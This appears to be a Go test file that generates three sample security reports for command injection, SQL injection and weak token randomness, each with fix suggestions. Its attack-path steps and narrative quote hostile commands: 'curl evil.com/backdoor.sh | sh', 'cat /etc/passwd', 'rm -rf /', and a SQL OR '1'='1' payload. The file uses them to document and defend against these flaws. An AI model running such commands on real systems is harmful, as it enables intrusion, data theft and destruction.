package agent

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"
)

// TestGenerateCaseReports produces 3 sample agent reports from hand-crafted
// AnalystResults. These serve as reference outputs for Day 2 deliverables
// and demonstrate what the full Agent Engine will produce once built.
func TestGenerateCaseReports(t *testing.T) {
	builder := NewReportBuilder()
	outDir := filepath.Join("..", "..", "testdata", "agent_bench")

	cases := []struct {
		filename string
		result   AnalystResult
	}{
		{
			filename: "case_report_cmd_injection.md",
			result: AnalystResult{
				FindingID:     "CASE-001",
				Title:         "Command Injection via shell=True in Flask Route",
				Severity:      SevCritical,
				IsExploitable: true,
				Confidence:    0.97,
				Narrative: buildCmdInjectionNarrative(),
				AttackPath: []AttackStep{
					{StepNumber: 1, Description: "Attacker discovers the /exec endpoint (likely from API docs, JS source, or fuzzing)", FileRef: "injection.py", LineRef: 29},
					{StepNumber: 2, Description: "Sends GET /exec?cmd=cat+/etc/passwd — shell=True passes to /bin/sh -c", FileRef: "injection.py", LineRef: 32},
					{StepNumber: 3, Description: "Confirms RCE via output. Escalates: curl evil.com/backdoor.sh | sh", FileRef: "", LineRef: 0},
					{StepNumber: 4, Description: "Establishes reverse shell, exfiltrates database, deploys crypto miner or ransomware", FileRef: "", LineRef: 0},
				},
				Evidence: []EvidenceItem{
					{Type: "code", Description: "User input flows directly to subprocess: request.args.get('cmd') → check_output(cmd, shell=True)", FilePath: "injection.py", LineNumber: 32, CodeSnippet: "cmd = request.args.get('cmd')\noutput = subprocess.check_output(cmd, shell=True)", Confidence: "certain"},
					{Type: "code", Description: "No input validation or sanitization between request and execution", FilePath: "injection.py", LineNumber: 31, CodeSnippet: "def run_cmd():\n    cmd = request.args.get('cmd')\n    output = subprocess.check_output(cmd, shell=True)", Confidence: "certain"},
					{Type: "code", Description: "Flask debug mode enabled — detailed error messages may leak to attacker", FilePath: "injection.py", LineNumber: 68, CodeSnippet: "app.run(debug=True)", Confidence: "possible"},
				},
				Verification: VerificationResult{
					Verified:    true,
					Method:      "ast-reachability",
					Detail:      "Direct data flow path from HTTP request parameter to subprocess execution. No middleware, no validation layer, no sanitization.",
					IsReachable: true,
					ReachPath:   "Flask request.args.get('cmd') → local variable cmd → subprocess.check_output(cmd, shell=True) → /bin/sh -c",
				},
				CWE:           "CWE-78",
				CVSS:          9.8,
				FixSuggestion: "Immediate: Remove shell=True. Use subprocess with argument list:\n\nresult = subprocess.check_output(['ping', '-c', '1', host], shell=False)\n\nBetter: Avoid subprocess entirely. Use Python-native libraries.\n\nIf subprocess is unavoidable:\n1. Validate input against whitelist\n2. Use shlex.quote() for escaping\n3. Run in sandboxed container with minimal privileges",
				RawFindings: []RawFinding{
					{Source: "semgrep", RuleID: "python.lang.security.audit.subprocess-shell-true", FilePath: "injection.py", Line: 32, Snippet: "subprocess.check_output(cmd, shell=True)"},
				},
			},
		},
		{
			filename: "case_report_sql_injection.md",
			result: AnalystResult{
				FindingID:     "CASE-002",
				Title:         "SQL Injection in Flask User Lookup",
				Severity:      SevHigh,
				IsExploitable: true,
				Confidence:    0.92,
				Narrative: buildSQLInjectionNarrative(),
				AttackPath: []AttackStep{
					{StepNumber: 1, Description: "Attacker sends GET /user/admin'+OR+'1'='1'--", FileRef: "injection.py", LineRef: 10},
					{StepNumber: 2, Description: "f-string produces: SELECT * FROM users WHERE name = 'admin' OR '1'='1'--'", FileRef: "injection.py", LineRef: 13},
					{StepNumber: 3, Description: "Query returns all rows. Attacker escalates: UNION SELECT to extract schema, then dump all tables", FileRef: "", LineRef: 0},
				},
				Evidence: []EvidenceItem{
					{Type: "code", Description: "f-string directly interpolates URL parameter into SQL", FilePath: "injection.py", LineNumber: 13, CodeSnippet: "query = f\"SELECT * FROM users WHERE name = '{username}'\"", Confidence: "certain"},
					{Type: "code", Description: "No parameterized query or ORM escaping used", FilePath: "injection.py", LineNumber: 14, CodeSnippet: "return conn.execute(query).fetchall()", Confidence: "certain"},
				},
				Verification: VerificationResult{
					Verified:    true,
					Method:      "ast-reachability",
					Detail:      "URL path parameter flows directly into SQL string via f-string interpolation. No parameterization.",
					IsReachable: true,
					ReachPath:   "Flask route /user/<username> → f-string → sqlite3.execute()",
				},
				CWE: "CWE-89",
				CVSS: 8.6,
				FixSuggestion: "Use parameterized queries:\n\nquery = \"SELECT * FROM users WHERE name = ?\"\nreturn conn.execute(query, (username,)).fetchall()",
				RawFindings: []RawFinding{
					{Source: "semgrep", RuleID: "python.lang.security.audit.sql-injection", FilePath: "injection.py", Line: 13, Snippet: "f\"SELECT * FROM users WHERE name ="},
				},
			},
		},
		{
			filename: "case_report_weak_random.md",
			result: AnalystResult{
				FindingID:     "CASE-003",
				Title:         "Insecure Random Number Generator for Token Generation",
				Severity:      SevMedium,
				IsExploitable: true,
				Confidence:    0.78,
				Narrative: buildWeakRandomNarrative(),
				AttackPath: []AttackStep{
					{StepNumber: 1, Description: "Attacker observes tokens (session IDs, reset links, API keys) generated by this function", FileRef: "crypto.go", LineRef: 53},
					{StepNumber: 2, Description: "Reconstructs the math/rand seed from known token + timestamp (typically 2^32 search space)", FileRef: "crypto.go", LineRef: 55},
					{StepNumber: 3, Description: "Predicts future tokens and hijacks sessions or password reset links", FileRef: "", LineRef: 0},
				},
				Evidence: []EvidenceItem{
					{Type: "code", Description: "Uses math/rand.Read instead of crypto/rand.Read", FilePath: "crypto.go", LineNumber: 55, CodeSnippet: "import \"math/rand\"\n...\nrand.Read(b) // math/rand, NOT crypto/rand", Confidence: "certain"},
				},
				Verification: VerificationResult{
					Verified:    true,
					Method:      "ast-reachability",
					Detail:      "generateTokenBad() called from main(). Token generation function uses math/rand.",
					IsReachable: true,
					ReachPath:   "main() → generateTokenBad() → math/rand.Read()",
				},
				CWE: "CWE-338",
				CVSS: 5.9,
				FixSuggestion: "Replace math/rand with crypto/rand:\n\nimport \"crypto/rand\"\nfunc generateTokenGood() (string, error) {\n    b := make([]byte, 32)\n    _, err := rand.Read(b)\n    if err != nil {\n        return \"\", err\n    }\n    return base64.StdEncoding.EncodeToString(b), nil\n}",
			},
		},
	}

	for _, c := range cases {
		t.Run(c.filename, func(t *testing.T) {
			report, err := builder.BuildReport(c.result)
			require.NoError(t, err)
			require.NotEmpty(t, report)

			outPath := filepath.Join(outDir, c.filename)
			err = os.WriteFile(outPath, []byte(report), 0644)
			require.NoError(t, err)

			t.Logf("Generated %s (%d bytes)", c.filename, len(report))
		})
	}
}

func buildCmdInjectionNarrative() string {
	return `The /exec endpoint in injection.py passes user-controlled input directly to subprocess.check_output() with shell=True. This is one of the most dangerous patterns in Python web applications.

What makes this exploitable:
1. request.args.get('cmd') — attacker-controlled, no validation
2. shell=True — passes the string to /bin/sh -c, enabling shell metacharacters
3. check_output() — executes and returns output, confirming success

Impact: Full remote code execution on the server. The attacker can run any command with the application's privileges, including:
- Read/write files (cat /etc/passwd, rm -rf /)
- Download and execute malware (curl evil.com/backdoor | sh)
- Establish reverse shell for persistent access
- Pivot to internal network resources`
}

func buildSQLInjectionNarrative() string {
	return `The /user/<username> endpoint uses Python f-string interpolation to build SQL queries from URL path parameters. This allows attackers to inject arbitrary SQL.

The vulnerability exists because:
1. The username comes directly from the URL path (attacker-controlled)
2. f-string interpolation happens BEFORE the SQL engine sees the query
3. No parameterization or escaping is applied

A simple OR 1=1 payload would return ALL users instead of one.`
}

func buildWeakRandomNarrative() string {
	return `The generateTokenBad() function in crypto.go uses math/rand.Read() instead of crypto/rand.Read() for generating 32-byte tokens.

math/rand is a deterministic PRNG seeded from a 64-bit integer (often Unix timestamp). An attacker who knows or can guess the seed can predict all tokens generated by this function.

The fix is a one-line change: import crypto/rand instead of math/rand.`
}
